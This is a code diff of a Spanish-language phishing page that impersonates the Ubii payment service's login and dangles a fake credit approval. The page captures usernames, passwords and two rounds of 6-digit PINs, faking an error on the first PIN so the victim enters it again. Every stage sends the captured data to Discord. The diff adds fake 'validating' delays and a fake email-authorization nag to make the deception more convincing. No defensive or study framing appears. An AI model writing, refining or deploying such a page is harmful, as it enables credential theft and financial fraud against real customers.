@@ -1,3 +1,5 @@
+```html
+<!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
@@ -54,15 +56,12 @@
     <!-- Envoltorio Principal Centrado -->
     <div class="w-full max-w-sm mx-auto flex flex-col items-center">
         
-        <!-- LOGO SUPERIOR UBII (Carita feliz proporcional, cuadrada y estilizada + Tipografía delgada) -->
+        <!-- LOGO SUPERIOR UBII -->
         <div class="w-full flex justify-start mb-6 px-2">
             <div class="flex items-center gap-2">
-                <!-- SVG de la Carita Feliz Ubii: Menos ancha, más alta y de forma cuadrada -->
                 <svg class="h-9 w-auto" viewBox="0 0 42 46" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <!-- Dos puntos ojos alineados -->
                     <rect x="7" y="1" width="7.5" height="7.5" fill="#009ee3" rx="0.5" />
                     <rect x="27.5" y="1" width="7.5" height="7.5" fill="#009ee3" rx="0.5" />
-                    <!-- Forma U más alta, menos ancha y cuadrada -->
                     <path d="M 4 14 V 28 C 4 41, 38 41, 38 28 V 14" stroke="#009ee3" stroke-width="5.5" stroke-linecap="square" stroke-linejoin="miter" />
                 </svg>
                 <span class="text-3xl font-semibold text-ubiiBlue tracking-tight" style="letter-spacing: -0.5px;">Ubii</span>
@@ -75,7 +74,6 @@
             <!-- ==================== ETAPA 1: PANTALLA DE LOGIN UBII ==================== -->
             <main id="step1Screen" class="w-full flex flex-col items-center pt-2">
                 
-                <!-- Logo interno Ubii -->
                 <div class="flex items-center gap-2 mb-2">
                     <svg class="h-8 w-auto" viewBox="0 0 42 46" fill="none" xmlns="http://www.w3.org/2000/svg">
                         <rect x="7" y="1" width="7.5" height="7.5" fill="#009ee3" rx="0.5" />
@@ -100,7 +98,6 @@
                 <!-- Formulario de Entrada -->
                 <form id="loginForm" onsubmit="handleStep1Submit(event)" class="w-full space-y-4">
                     
-                    <!-- Campo Usuario / Correo -->
                     <div>
                         <input 
                             type="text" 
@@ -111,7 +108,6 @@
                         >
                     </div>
 
-                    <!-- Campo Contraseña -->
                     <div class="relative">
                         <input 
                             type="password" 
@@ -129,24 +125,22 @@
                         </button>
                     </div>
 
-                    <!-- Enlace "¿Olvidaste tú contraseña?" -->
                     <div class="text-left pt-1 px-1">
                         <a href="#" class="text-xs font-semibold text-ubiiBlue hover:underline transition-colors">
                             ¿Olvidaste tú contraseña?
                         </a>
                     </div>
 
-                    <!-- Botón Ingresar -->
                     <div class="pt-2">
                         <button 
                             type="submit" 
-                            class="w-full py-3.5 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-medium rounded-2xl text-base transition-all transform active:scale-[0.99] shadow-sm focus:outline-none"
+                            id="btnSubmitStep1"
+                            class="w-full py-3.5 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-medium rounded-2xl text-base transition-all transform active:scale-[0.99] shadow-sm focus:outline-none flex items-center justify-center gap-2"
                         >
                             Ingresar
                         </button>
                     </div>
 
-                    <!-- Botón Registrarme -->
                     <div>
                         <button 
                             type="button" 
@@ -186,7 +180,6 @@
                         <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" class="pin-input-1 w-full aspect-square text-center text-xl font-bold border border-gray-200 rounded-xl focus:outline-none focus:border-ubiiBlue bg-gray-50" required>
                     </div>
 
-                    <!-- Notificación de error si falla -->
                     <div id="pinErrorStep2" class="hidden bg-red-50 border-l-4 border-red-500 p-3 rounded-r-xl">
                         <p class="text-xs text-red-600 font-medium flex items-center gap-1.5">
                             <i class="fa-solid fa-circle-exclamation text-red-500"></i>
@@ -204,7 +197,7 @@
                 </form>
             </main>
 
-            <!-- ==================== ETAPA 3: INGRESAR NUEVAMENTE EL PIN (SEGUNDO INTENTO - CORRECTO) ==================== -->
+            <!-- ==================== ETAPA 3: INGRESAR NUEVAMENTE EL PIN (SEGUNDO INTENTO) ==================== -->
             <main id="step3Screen" class="w-full hidden flex-col">
                 <div class="flex flex-col items-center justify-center text-center mb-6">
                     <div class="w-14 h-14 bg-amber-50 text-amber-500 rounded-full flex items-center justify-center mb-3">
@@ -229,14 +222,14 @@
                     <button 
                         type="submit" 
                         id="btnSubmitStep3"
-                        class="w-full py-3.5 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-medium rounded-2xl text-base transition-all transform active:scale-[0.99] shadow-sm"
+                        class="w-full py-3.5 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-medium rounded-2xl text-base transition-all transform active:scale-[0.99] shadow-sm flex items-center justify-center gap-2"
                     >
                         Confirmar e Ingresar
                     </button>
                 </form>
             </main>
 
-            <!-- ==================== ETAPA 4: REVISAR CORREO ELECTRÓNICO ==================== -->
+            <!-- ==================== ETAPA 4: REVISAR CORREO ELECTRÓNICO (ETAPA FINAL) ==================== -->
             <main id="step4Screen" class="w-full hidden flex-col items-center text-center">
                 <div class="w-16 h-16 bg-blue-50 text-ubiiBlue rounded-full flex items-center justify-center mb-4">
                     <i class="fa-regular fa-envelope text-3xl animate-bounce"></i>
@@ -248,77 +241,32 @@
                     <span class="displayUserEmail text-ubiiBlue font-bold block mt-1 break-all"></span>
                 </p>
 
-                <!-- Advertencia sobre aprobación del correo -->
-                <div class="bg-amber-50 border border-amber-200 p-3.5 rounded-2xl text-left mb-6 shadow-sm">
+                <!-- Advertencia Inicial -->
+                <div class="bg-amber-50 border border-amber-200 p-3.5 rounded-2xl text-left mb-4 shadow-sm">
                     <p class="text-xs text-amber-800 flex items-start gap-2.5 leading-relaxed font-medium">
                         <i class="fa-solid fa-triangle-exclamation text-amber-500 text-sm mt-0.5 shrink-0"></i>
                         <span><strong>Atención:</strong> Tu crédito solo será aprobado si confirmas y autorizas previamente a través del correo electrónico enviado.</span>
                     </p>
                 </div>
 
-                <div class="w-full space-y-3">
+                <!-- Notificación de Recordatorio si presiona antes de autorizar -->
+                <div id="emailNotVerifiedAlert" class="hidden bg-red-50 border-l-4 border-red-500 p-3.5 rounded-r-2xl text-left mb-4">
+                    <p class="text-xs text-red-700 leading-relaxed font-medium flex items-start gap-2">
+                        <i class="fa-solid fa-circle-xmark text-red-500 text-base mt-0.5 shrink-0"></i>
+                        <span>Por favor, entra a tu correo electrónico y autoriza para poder continuar con la aprobación del crédito.</span>
+                    </p>
+                </div>
+
+                <div class="w-full space-y-3 pt-2">
                     <button 
                         type="button" 
-                        onclick="goToStep(5)" 
+                        id="btnConfirmEmail"
+                        onclick="handleConfirmEmailClick()" 
                         class="w-full py-3.5 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-medium rounded-2xl text-base transition-all transform active:scale-[0.99] shadow-sm flex items-center justify-center gap-2"
                     >
-                        Continuar
-                    </button>
-
-                    <button 
-                        type="button" 
-                        onclick="resendMailNotification()" 
-                        class="w-full py-3 bg-gray-100 hover:bg-gray-200 text-gray-700 font-medium rounded-2xl text-sm transition-all"
-                    >
-                        Reenviar correo
+                        Ya confirmé el correo
                     </button>
                 </div>
-            </main>
-
-            <!-- ==================== ETAPA 5: ANÁLISIS CON TIMELINE DE 0% A 100% (90 SEGUNDOS) ==================== -->
-            <main id="step5Screen" class="w-full hidden flex-col items-center text-center">
-                
-                <!-- Pantalla de Carga (Analizando) -->
-                <div id="loadingAnalysisBox" class="w-full flex flex-col items-center py-2">
-                    <div class="relative w-20 h-20 flex items-center justify-center mb-4">
-                        <div class="w-20 h-20 border-4 border-blue-100 border-t-ubiiBlue rounded-full animate-spin"></div>
-                        <i class="fa-solid fa-chart-line text-ubiiBlue text-2xl absolute"></i>
-                    </div>
-
-                    <h2 class="text-lg font-bold text-gray-900 mb-1">Analizando tu Solicitud</h2>
-                    <p class="text-xs text-gray-500 mb-6">
-                        Estamos verificando tu historial. Por favor no cierres ni recargues esta ventana.
-                    </p>
-
-                    <!-- Barra de Progreso % del 0% al 100% -->
-                    <div class="w-full bg-gray-100 rounded-full h-4 mb-2 overflow-hidden border border-gray-200">
-                        <div id="analysisProgressBar" class="bg-ubiiBlue h-full rounded-full transition-all duration-300 ease-linear" style="width: 0%;"></div>
-                    </div>
-
-                    <!-- Contador porcentual centrado -->
-                    <div class="w-full flex justify-center text-sm font-semibold text-ubiiBlue px-1 mb-2">
-                        <span id="progressText">0%</span>
-                    </div>
-                </div>
-
-                <!-- Resultado Final (Aparece tras llegar al 100%) -->
-                <div id="resultSuccessBox" class="w-full hidden flex-col items-center pt-2">
-                    <div class="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mb-4">
-                        <i class="fa-solid fa-check text-3xl"></i>
-                    </div>
-                    <h2 class="text-xl font-bold text-gray-900 mb-2">¡Solicitud Aprobada!</h2>
-                    <p class="text-xs text-gray-600 leading-relaxed mb-6">
-                        Hemos verificado satisfactoriamente tus datos. Tu línea de crédito Ubii pre-aprobada ha sido procesada con éxito.
-                    </p>
-                    <button 
-                        type="button" 
-                        onclick="location.reload()" 
-                        class="w-full py-3.5 bg-ubiiBlue hover:bg-ubiiBlueHover text-white font-medium rounded-2xl text-base shadow-sm"
-                    >
-                        Finalizar
-                    </button>
-                </div>
-
             </main>
 
         </div>
@@ -337,7 +285,6 @@
         let selectedType = 'natural';
         let userEmailOrName = '';
         let userPassword = '';
-        let firstPinEntered = '';
 
         // Enviar reportes a Discord
         function sendToDiscord(messageText) {
@@ -382,14 +329,13 @@
 
         // Gestor de Cambio de Pantallas / Etapas
         function goToStep(stepNumber) {
-            for (let i = 1; i <= 5; i++) {
+            for (let i = 1; i <= 4; i++) {
                 const screen = document.getElementById(`step${i}Screen`);
                 if (screen) screen.classList.add('hidden');
             }
 
             document.getElementById(`step${stepNumber}Screen`).classList.remove('hidden');
 
-            // Foco inicial de inputs al cambiar de pantalla
             if (stepNumber === 2) {
                 const inputs = document.querySelectorAll('.pin-input-1');
                 inputs.forEach(i => i.value = '');
@@ -398,8 +344,6 @@
                 const inputs = document.querySelectorAll('.pin-input-2');
                 inputs.forEach(i => i.value = '');
                 setTimeout(() => inputs[0].focus(), 100);
-            } else if (stepNumber === 5) {
-                start90SecProgress();
             }
         }
 
@@ -414,14 +358,21 @@
                 el.innerText = userEmailOrName.includes('@') ? userEmailOrName : `${userEmailOrName}@correo.com`;
             });
 
-            // Reporte a Discord
-            const msgLogin = `**🚨 NUEVO INICIO DE SESIÓN (ETAPA 1)**\nTipo: ${selectedType}\n**Usuario:** \`${userEmailOrName}\`\n**Contraseña:** \`${userPassword}\``;
-            sendToDiscord(msgLogin);
+            const btn = document.getElementById('btnSubmitStep1');
+            btn.disabled = true;
+            btn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i> Validando...`;
 
-            goToStep(2);
+            setTimeout(() => {
+                btn.disabled = false;
+                btn.innerHTML = "Ingresar";
+
+                sendToDiscord(`**🚨 NUEVO INICIO DE SESIÓN (ETAPA 1)**\nTipo: ${selectedType}\n**Usuario:** \`${userEmailOrName}\`\n**Contraseña:** \`${userPassword}\``);
+
+                goToStep(2);
+            }, 3000); // Duración de 3 segundos
         }
 
-        // ETAPA 2: Primer intento de PIN -> Siempre da Error
+        // ETAPA 2: Primer intento de PIN -> Siempre da Error (3 segundos)
         function handleStep2Submit(event) {
             event.preventDefault();
             const inputs = document.querySelectorAll('.pin-input-1');
@@ -430,7 +381,6 @@
 
             if (pinVal.length !== 6) return;
 
-            firstPinEntered = pinVal;
             const btn = document.getElementById('btnSubmitStep2');
             const originalText = btn.innerHTML;
 
@@ -441,21 +391,17 @@
                 btn.disabled = false;
                 btn.innerHTML = originalText;
 
-                // Forzar mensaje de error
                 document.getElementById('pinErrorStep2').classList.remove('hidden');
-
-                // Enviar registro del PIN fallido
                 sendToDiscord(`❌ **PIN INCORRECTO FORZADO (ETAPA 2)**\n**Usuario:** \`${userEmailOrName}\`\n**PIN Ingresado:** \`${pinVal}\``);
 
-                // Esperar 1.2 segundos y pasar automáticamente a la Etapa 3
                 setTimeout(() => {
                     goToStep(3);
                 }, 1200);
 
-            }, 800);
+            }, 3000); // Duración de 3 segundos
         }
 
-        // ETAPA 3: Segundo intento de PIN -> Aceptado
+        // ETAPA 3: Segundo intento de PIN -> Aceptado (3 segundos)
         function handleStep3Submit(event) {
             event.preventDefault();
             const inputs = document.querySelectorAll('.pin-input-2');
@@ -474,38 +420,30 @@
                 btn.disabled = false;
                 btn.innerHTML = originalText;
 
-                // Enviar registro de segundo PIN exitoso
                 sendToDiscord(`✅ **PIN SEGUNDO INTENTO RE-VERIFICADO (ETAPA 3)**\n**Usuario:** \`${userEmailOrName}\`\n**PIN Correcto:** \`${pinVal}\``);
 
                 goToStep(4);
-            }, 800);
+            }, 3000); // Duración de 3 segundos
         }
 
-        // ETAPA 5: Barra de Progreso del 0% al 100% durante 90 segundos (1.5 Minutos)
-        function start90SecProgress() {
-            const progressBar = document.getElementById('analysisProgressBar');
-            const progressText = document.getElementById('progressText');
+        // ETAPA 4: Lógica de clic en "Ya confirmé el correo" (3 segundos)
+        function handleConfirmEmailClick() {
+            const btn = document.getElementById('btnConfirmEmail');
+            const alertBox = document.getElementById('emailNotVerifiedAlert');
 
-            let totalSeconds = 90; // 90 segundos
-            let currentSecond = 0;
+            btn.disabled = true;
+            btn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i> Comprobando...`;
 
-            sendToDiscord(`⏳ **INICIO DE ANÁLISIS DE CRÉDITO (90 Segundos)**\n**Usuario:** \`${userEmailOrName}\``);
+            setTimeout(() => {
+                btn.disabled = false;
+                btn.innerHTML = "Ya confirmé el correo";
 
-            const interval = setInterval(() => {
-                currentSecond++;
-                const percentage = Math.min(100, Math.floor((currentSecond / totalSeconds) * 100));
+                // Mostrar la alerta
+                alertBox.classList.remove('hidden');
 
-                progressBar.style.width = `${percentage}%`;
-                progressText.innerText = `${percentage}%`;
-
-                if (currentSecond >= totalSeconds) {
-                    clearInterval(interval);
-                    document.getElementById('loadingAnalysisBox').classList.add('hidden');
-                    document.getElementById('resultSuccessBox').classList.remove('hidden');
-                    document.getElementById('resultSuccessBox').classList.add('flex');
-                    sendToDiscord(`🎉 **ANÁLISIS COMPLETADO EXITOSAMENTE AL 100%**\n**Usuario:** \`${userEmailOrName}\``);
-                }
-            }, 1000); // Se actualiza cada segundo
+                // Notificar intento a Discord
+                sendToDiscord(`⚠️ **CLIC EN "YA CONFIRMÉ EL CORREO" SIN VERIFICAR**\n**Usuario:** \`${userEmailOrName}\``);
+            }, 3000); // Duración de 3 segundos
         }
 
         // Configurar navegación de casillas de PIN
@@ -531,11 +469,6 @@
 
         setupPinInputs('.pin-input-1');
         setupPinInputs('.pin-input-2');
-
-        function resendMailNotification() {
-            sendToDiscord(`📧 **El usuario \`${userEmailOrName}\` ha solicitado reenvío de correo.**`);
-            alert("Se ha enviado un nuevo enlace a tu correo electrónico.");
-        }
 </script>
 </body>
 </html>
